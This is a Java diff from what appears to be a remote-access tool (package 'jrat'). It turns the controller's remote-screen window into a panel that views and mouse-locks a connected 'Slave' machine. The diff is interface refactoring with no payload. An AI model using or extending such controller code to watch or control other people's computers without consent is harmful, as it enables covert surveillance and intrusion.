@@ -2,13 +2,13 @@ package jrat.module.screen.ui;
 
 import graphslib.monitors.RemoteMonitor;
 import jrat.api.Resources;
+import jrat.api.ui.ClientPanel;
 import jrat.common.utils.DataUnits;
 import jrat.controller.ErrorDialog;
 import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.*;
 import jrat.controller.threads.ThreadFPS;
 import jrat.controller.ui.components.JRemoteScreenPane;
-import jrat.controller.ui.frames.BaseFrame;
 import jrat.controller.ui.renderers.JComboBoxIconRenderer;
 import jrat.module.screen.packets.PacketRemoteScreenStop;
 
@@ -23,7 +23,7 @@ import java.io.File;
 
 
 @SuppressWarnings("serial")
-public class FrameRemoteScreen extends BaseFrame {
+public class PanelScreenController extends ClientPanel {
 
 	private BufferedImage buffer;
 	
@@ -60,21 +60,11 @@ public class FrameRemoteScreen extends BaseFrame {
 	private JLabel lblBlockSize;
 	private JLabel lblChunks;
 
-	public FrameRemoteScreen(Slave sl) {
-		super(sl);
-		addWindowListener(new WindowAdapter() {
-			@Override
-			public void windowClosing(WindowEvent arg0) {
-				exit();
-			}
-		});
+	public PanelScreenController(Slave sl) {
+		super(sl, "Screen", Resources.getIcon("screen"));
+
 		slave = sl;
 		threadFps.start();
-		
-		setTitle("Remote Screen");
-		setIconImage(Resources.getIcon("monitor").getImage());
-		setDefaultCloseOperation(DISPOSE_ON_CLOSE);
-		setBounds(100, 100, 673, 446);
 
 		toolBarTop = new JToolBar();
 		toolBarTop.setFloatable(false);
@@ -263,7 +253,7 @@ public class FrameRemoteScreen extends BaseFrame {
 		toolBarTop.add(tglbtnToggleMovement);
 		
 		toolBarTop.addSeparator();
-		GroupLayout groupLayout = new GroupLayout(getContentPane());
+		GroupLayout groupLayout = new GroupLayout(this);
 		groupLayout.setHorizontalGroup(
 			groupLayout.createParallelGroup(Alignment.LEADING)
 				.addComponent(toolBarTop, GroupLayout.PREFERRED_SIZE, 657, GroupLayout.PREFERRED_SIZE)
@@ -277,7 +267,7 @@ public class FrameRemoteScreen extends BaseFrame {
 					.addComponent(screenPane, GroupLayout.DEFAULT_SIZE, 357, Short.MAX_VALUE)
 					.addComponent(toolBarBottom, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
 		);
-		getContentPane().setLayout(groupLayout);
+		setLayout(groupLayout);
 	}
 	
 	public void sendUpdate() {
@@ -298,13 +288,27 @@ public class FrameRemoteScreen extends BaseFrame {
 		transmitted = 0;
 		slave.addToSendQueue(new PacketRemoteScreenStop());
 	}
-	
-	public void exit() {
+
+	@Override
+	public void dispose() {
+	    super.dispose();
+
 		threadFps.stopRunning();
 
 		slave.addToSendQueue(new Packet27ToggleMouseLock(false));
 		slave.addToSendQueue(new PacketRemoteScreenStop());
 	}
+
+	public Frame displayFrame() {
+        Frame frame = super.displayFrame();
+
+        if (slave.getMonitors().length > 1) {
+            DialogMonitors dialog = new DialogMonitors(this, slave);
+            dialog.setVisible(true);
+        }
+
+        return frame;
+    }
 	
 	public void capture() {
 		BufferedImage image = screenPane.getPanel().getImage();
@@ -330,16 +334,6 @@ public class FrameRemoteScreen extends BaseFrame {
 	
 	public void update(BufferedImage image) {
 		screenPane.update(image);
-	}
-
-	public static void show(Slave sl) {
-		FrameRemoteScreen frame = new FrameRemoteScreen(sl);
-		frame.setVisible(true);
-		
-		if (sl.getMonitors().length != 1) {
-			DialogMonitors dialog = new DialogMonitors(frame, sl);
-			dialog.setVisible(true);
-		}
 	}
 
 	public int getMonitor() {
